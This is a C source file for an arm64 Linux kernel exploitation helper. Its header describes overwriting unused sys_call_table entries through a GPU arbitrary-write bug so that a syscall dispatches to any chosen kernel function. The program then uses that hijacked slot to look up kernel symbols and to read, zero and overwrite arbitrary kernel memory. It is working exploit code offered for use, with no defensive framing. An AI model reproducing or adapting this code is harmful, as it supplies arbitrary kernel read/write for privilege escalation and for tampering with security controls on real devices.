/*
 * kfunc - call an arbitrary kernel function from a 64-bit process by abusing
 *         unused entries of sys_call_table.
 *
 * Background
 * ----------
 * The kernel on the target is arm64, so sys_call_table[] holds 8-byte
 * pointers.  Entries [244..259] are all sys_ni_syscall ("not implemented"),
 * i.e. 16 consecutive slots nobody calls.  One 128-byte write from
 * gpu_arb_write() fills all 16 of them with the same address, and the kernel
 * then happily dispatches our syscall number into that function.
 *
 * Because the syscall ABI passes arguments in x0..x5 and returns x0, the
 * called function sees our arguments and we get its return value back.  There
 * is no PAN on this target, so the kernel can also read strings and buffers
 * that live in our address space.
 *
 * Note: a *32-bit* process does NOT go through this table - it goes through
 * compat_sys_call_table, which lives in .text.  That is why this helper must
 * be a 64-bit (aarch64) binary.
 *
 * Build (64-bit ARM, static):
 *   aarch64-linux-musl-gcc -O1 -static -o kfunc kfunc.c
 *
 * Modes (the table entry must already point at the matching function):
 *   kfunc sym  <name>            kallsyms_lookup_name(name)   -> prints address
 *   kfunc zero <addr_hex> <len>  memcpy(addr, zeros, len)
 *   kfunc str  <addr_hex> <text> memcpy(addr, text, len+1)
 *   kfunc show <addr_hex> <len>  memcpy(buf, addr, len)       -> hexdump
 */
#define _GNU_SOURCE
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <unistd.h>

#define SLOT 244

static unsigned char buf[8192];
static unsigned char src[8192];

static unsigned long call3(unsigned long a0, unsigned long a1, unsigned long a2)
{
    return (unsigned long)syscall(SLOT, a0, a1, a2);
}

int main(int argc, char **argv)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    if (argc < 2) {
        fprintf(stderr, "usage: see source header\n");
        return 1;
    }

    if (!strcmp(argv[1], "sym") && argc >= 3) {
        char name[128];
        strncpy(name, argv[2], sizeof name - 1);
        name[sizeof name - 1] = 0;
        unsigned long a = call3((unsigned long)name, 0, 0);
        printf("%s = 0x%016lx\n", name, a);
        return (a > 0xffffff0000000000UL) ? 0 : 2;
    }

    if (!strcmp(argv[1], "zero") && argc >= 4) {
        unsigned long dst = strtoul(argv[2], NULL, 16);
        int len = atoi(argv[3]);
        if (len <= 0 || len > (int)sizeof src) return 1;
        memset(src, 0, len);
        unsigned long r = call3(dst, (unsigned long)src, (unsigned long)len);
        printf("memset-ish 0x%lx <- 0 (%d bytes), ret=0x%lx\n", dst, len, r);
        return 0;
    }

    if (!strcmp(argv[1], "str") && argc >= 4) {
        unsigned long dst = strtoul(argv[2], NULL, 16);
        int len = (int)strlen(argv[3]) + 1;
        if (len > (int)sizeof src) return 1;
        memcpy(src, argv[3], len);
        unsigned long r = call3(dst, (unsigned long)src, (unsigned long)len);
        printf("memcpy 0x%lx <- \"%s\" (%d bytes), ret=0x%lx\n", dst, argv[3], len, r);
        return 0;
    }

    if (!strcmp(argv[1], "show") && argc >= 4) {
        unsigned long src_addr = strtoul(argv[2], NULL, 16);
        int len = atoi(argv[3]);
        if (len <= 0 || len > (int)sizeof buf) return 1;
        memset(buf, 0, sizeof buf);
        call3((unsigned long)buf, src_addr, (unsigned long)len);
        for (int i = 0; i < len; i++) {
            printf("%02x", buf[i]);
            if ((i & 15) == 15) printf("\n");
        }
        if (len & 15) printf("\n");
        return 0;
    }

    fprintf(stderr, "unknown mode\n");
    return 1;
}
